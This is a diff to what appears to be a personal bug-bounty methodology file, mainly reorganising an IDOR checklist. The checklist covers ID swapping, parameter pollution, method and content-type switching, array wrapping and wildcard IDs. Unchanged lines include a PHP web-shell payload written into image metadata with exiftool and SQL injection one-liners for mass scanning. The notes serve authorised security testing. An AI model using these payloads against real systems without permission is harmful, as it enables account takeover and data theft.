@@ -950,37 +950,124 @@ nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
 
 
 
-   IDORS      IDORS      IDORS   
+                           IDORS      IDORS      IDORS   
    Base Steps:
 1. Create two accounts if possible or else enumerate users first.
 2. Check if the endpoint is private or public and does it contains any kind of id param.
 3. Try changing the param value to some other user and see if does anything to their account.
 4. Done !!
-[ ] [ ] image profilie [ ] delete acount [ ] infromation acount [ ] VIEW & DELETE & Create api_key [ ] allows
-to read any comment [ ] change price [ ] chnage the coin from dollar to uaro [ ] Try decode the ID, if the
-ID encoded using md5,base64,etc
-GET /GetUser/dmljdGltQG1haWwuY29t
-[...]
-[ ] change HTTP method
-GET /users/delete/victim_id ->403
-POST /users/delete/victim_id ->200
-[ ] Try replacing parameter names
-Instead of this:
+   
+   
+   ##tip   Add IDs to requests that don’t have them
+   GET /api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>
+
+  Pro tip: You can find parameter names to try by deleting or editing other objects and seeing the parameter names used.
+  
+  
+      ##tip  Try replacing parameter names
 GET /api/albums?album_id=<album id>
+
 Try This:
 GET /api/albums?account_id=<account id>
-Tip: There is a Burp extension called Paramalyzer which
-will help with this by remembering all the parameters you have passed to a host.
-[ ] Path Traversal
+
+Tip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.
+   
+   
+        ##tipSupply multiple values for the same parameter.
+GET /api/account?id=<your account id> →
+
+Try this:    
+GET /api/account?id=<your account id>&id=<admin's account id>
+
+GET /api_v1/messages?user_id=attacker_id&user_id=victim_id
+GET /api_v1/messages?user_id=victim_id&user_id=attacker_id
+
+GET /api/account?id=<your account id> →
+    /api/account?id=<your account id>&id=<admin's account id>
+
+Tip: This is known as HTTP parameter pollution. Something like this might get you access to the admin’s account
+    
+
+    ##tip   Try changing the HTTP request method when testing for IDORs
+   POST /api/account?id=<your account id> →
+
+   Try this:    
+PUT /api/account?id=<your account id>
+
+   Tip: Try switching POST and PUT and see if you can upload something to another user’s profile. For RESTful services, try changing GET to POST/PUT/DELETE to discover create/update/delete actions.
+   
+    
+    ##tip  : Try changing the request’s content type
+    
+    POST /api/chat/join/123 […] Content-type: application/xml → test
+Try this:
+POST /api/chat/join/123 […] Content-type: application/json {“user”: “test”}
+Tip: Access controls may be inconsistently implemented across different content types. Don’t forget to try alternative and less common values like text/xml, text/x-json, and similar
+
+     ##tip   : Try changing the requested file type (Test if Ruby)
+     Example:
+
+GET /user_data/2341 --> 401 Unauthorized
+GET /user_data/2341.json --> 200 OK
+
+GET /user_data/2341.xml -> 200
+GET /user_data/2341.config -> 200
+GET /user_data/2341.txt -> 200
+
+Tip: Experiment by appending different file extensions (e.g. .json, .xml, .config) to the end of requests that reference a document.
+
+     
+     ##tip    Does the app ask for non-numeric IDs? Use numeric IDs instead
+     There may be multiple ways of referencing objects in the database and the application only has access controls on one. 
+   Try numeric IDs anywhere non-numeric IDs are accepted:
+Example:
+
+username=user1 → username=1234
+account_id=7541A92F-0101-4D1E-BBB0-EB5032FE1686 → account_id=5678
+album_id=MyPictures → album_id=12
+
+  GET /file?id=90djbkdbkdbd29dd
+GET /file?id=302
+
+
+
+  ##tip Try using an array
+    If a regular ID replacement isn’t working, try wrapping the ID in an array and see if that does the trick. For example:
+
+    {“id”:19} → {“id”:[19]}
+     
+   {"userid":123} ->401
+    {"userid":[123]} ->200
+    
+    [ ] wrap the id with a json object
+{"userid":123} ->401
+{"userid":{"userid":123}} ->200
+
+   ##tip   json parameter changes
+    {"userid":"1", "password":"oops"},
+    {"password":"oops","userid":"1"}
+    
+    ##tip  : Wildcard ID **
+    These can be very exciting bugs to find in the wild and are so simple. Try replacing an ID with a wildcard. You might get lucky!
+
+GET /api/users/<user_id>/ → GET /api/users/*
+
+  
+  ##tip    Pay attention to new features
+  If you stumble upon a newly added feature within the web app, such as the ability to upload a profile picture for an upcoming charity event, and it performs an API call to:
+
+/api/CharityEventFeb2021/user/pp/<ID>
+
+It is possible that the application may not enforce access control for this new feature as strictly as it does for core features.
+
+   ##tip
+   [ ] Path Traversal
 POST /users/delete/victim_id ->403
 POST /users/delete/my_id/..victim_id ->200
-[ ] change request content-type
-Content-Type: application/xml ->
-Content-Type: application/json
-[ ] swap non-numeric with numeric id
-GET /file?id=90djbkdbkdbd29dd
-GET /file?id=302
-[ ] Missing Function Level Acess Control
+
+     ##tip 
+     
+     [ ] Missing Function Level Acess Control
 GET /admin/profile ->401
 GET /Admin/profile ->200
 GET /ADMIN/profile ->200
@@ -990,9 +1077,42 @@ GET /aDmin/profile ->200
 GET /adMin/profile ->200
 GET /admIn/profile ->200
 GET /admiN/profile ->200
-[ ]send wildcard instead of an id
-GET /api/users/user_id ->
-GET /api/users/*
+
+    tip 
+    [ ] Test an outdata API version
+    GET /v3/users_data/1234 ->401
+   GET /v1/users_data/1234 ->200
+   
+   tip
+   check if the intercept contains time, if yes try to delete and manipulate the time, rearragne the post, put or get parameter 
+   
+   tip
+   [ ] If the website using graphql, try to find IDOR using graphql!
+   GET /graphql
+   [...]
+  GET /graphql.php?query=
+   [...]
+   
+   
+   tip
+[ ] json parameter pollution
+{"userid":1234,"userid":2542}
+
+    tip
+    [ ] Bypass object level authorization Add parameter onto the endpoit if not present by defualt
+GET /api_v1/messages ->200
+GET /api_v1/messages?user_id=victim_uuid ->200
+  
+
+
+    ##########   ######      ######      #####
+
+[ ] [ ] image profilie [ ] delete acount [ ] infromation acount [ ] VIEW & DELETE & Create api_key [ ] allows
+to read any comment [ ] change price [ ] chnage the coin from dollar to uaro [ ] Try decode the ID, if the
+ID encoded using md5,base64,etc
+GET /GetUser/dmljdGltQG1haWwuY29t
+[...]
+
 [ ] Never ignore encoded/hashed ID
 for hashed ID ,create multiple accounts and understand the
 ppattern application users to allot an iD
@@ -1000,39 +1120,28 @@ ppattern application users to allot an iD
 search all the endpoints having ID which the search engine may have already indexed
 [ ] Bruteforce Hidden HTTP parameters
 use tools like arjun , paramminer
-[ ] Bypass object level authorization Add parameter onto the endpoit if not present by defualt
-GET /api_v1/messages ->200
-GET /api_v1/messages?user_id=victim_uuid ->200
-[ ] HTTP Parameter POllution Give mult value for same parameter
-GET /api_v1/messages?user_id=attacker_id&user_id=victim_id
-GET /api_v1/messages?user_id=victim_id&user_id=attacker_id
-[ ] change file type
-GET /user_data/2341 -> 401
-GET /user_data/2341.json -> 200
-GET /user_data/2341.xml -> 200
-GET /user_data/2341.config -> 200
-GET /user_data/2341.txt -> 200
-[ ] json parameter pollution
-{"userid":1234,"userid":2542}
-[ ] Wrap the ID with an array in the body
-{"userid":123} ->401
-{"userid":[123]} ->200
 
-[ ] wrap the id with a json object
-{"userid":123} ->401
-{"userid":{"userid":123}} ->200
-[ ] Test an outdata API version
-GET /v3/users_data/1234 ->401
-GET /v1/users_data/1234 ->200
-[ ] If the website using graphql, try to find IDOR using graphql!
-GET /graphql
-[...]
-GET /graphql.php?query=
-[...]
+    
+    tip
+    Sometimes when updating your account settings, they'll send your userid as a parameter. Manipulating this can sometimes result in another users profile being edited. Don't forget that if one feature is vulnerable to IDOR then it may be a site-wide issue (and don't forget to check mobile site!). Even if you do not see your ID in the post data, just simply try adding it. id=, uid=, userid=, especially if it is a GraphQL query or JSON post data (if it's PUT).
 
+ tip
+ reset password
+ check if you can   be able to control input that affects another user via their identifier, inside of userid, check if you change it to another identifier example phone no, email
+ NOTE NOTE 
+ Awlays Look for values which identifies you when interacting with the site/API, then to check if you can provide another users ID
 
-   
-   
+ SQL ERROR
+ POST /updateUser
+ Host: example.com
+
+ user_id=1338&name=test
+ 
+ If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code
+
+$sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337
+ 
+ 
    
    check for Alot of nos  in whatever reposnse  you have.  while intercepint in burpsuite, allows try to change every value, eg-> error to success, 1234 to 3456, check if id is encoded or not in a plain text, then decode it, 
    check if file can be accessed directly from the url, without needing port authecation   //images are commoly venearble to this
@@ -1325,6 +1434,9 @@ cat targets.txt  | httpx -mr "register"
    
    and always check out from the store, intercept the request, add more items to your bucket and then send the  intercepted request with burp repeater and watch the response
     
+    
+ 
+
 
 
                My Bug hunting Methodology 📝
@@ -3267,8 +3379,8 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
       
     
   TIP
-  ///ZSEANO TOOLKIT AND METHODOLOGY //
-    discovery subdomain and content
+  ///ZSEANO TOOLKIT AND METHODOLOGY //      ///ZSEANO TOOLKIT AND METHODOLOGY //      ///ZSEANO TOOLKIT AND METHODOLOGY //
+    discovery subdomain and content 
   amass: amass enum -brute-active -d domain.com -o amass-output.txt
   
   working http and https server
@@ -3419,6 +3531,18 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
   
   Time based SQL injection
   cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+  
+  
+   SQL ERROR
+ POST /updateUser
+ Host: example.com
+
+ user_id=1338&name=test
+ 
+ If you were to provide user_id=1338-1 and it was vulnerable, then the code would execute against user_id=1337. The code
+
+$sql = "UPDATE users SET name='test' WHERE id='1338-1'"; will be executed as being user id 1337
+ 
  
  
  
